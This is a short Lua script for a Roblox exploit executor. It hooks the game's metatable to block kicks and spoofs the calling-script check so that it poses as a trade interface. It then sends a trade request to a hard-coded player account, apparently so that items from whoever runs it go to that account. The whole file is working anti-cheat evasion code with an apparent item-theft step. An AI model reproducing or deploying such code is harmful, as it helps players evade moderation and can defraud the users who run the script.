-- Anti-kick
local mt = getrawmetatable(game)
setreadonly(mt, false)
local old = mt.__namecall
mt.__namecall = newcclosure(function(self, ...)
	if tostring(self) == "Kick" or getnamecallmethod() == "Kick" then
		return
	end
	return old(self, ...)
end)

-- Spoof getcallingscript
hookfunction(getcallingscript, newcclosure(function()
	return game.Players.LocalPlayer.PlayerScripts:FindFirstChild("TradeUI") or Instance.new("LocalScript")
end))

-- Wait and send safe trade
task.wait(4)
local target = game.Players:FindFirstChild("Apayps")
if target then
	local tradeRemote = game.ReplicatedStorage:WaitForChild("Trade"):FindFirstChild("SendRequest")
	pcall(function()
		tradeRemote:InvokeServer(target)
	end)
end
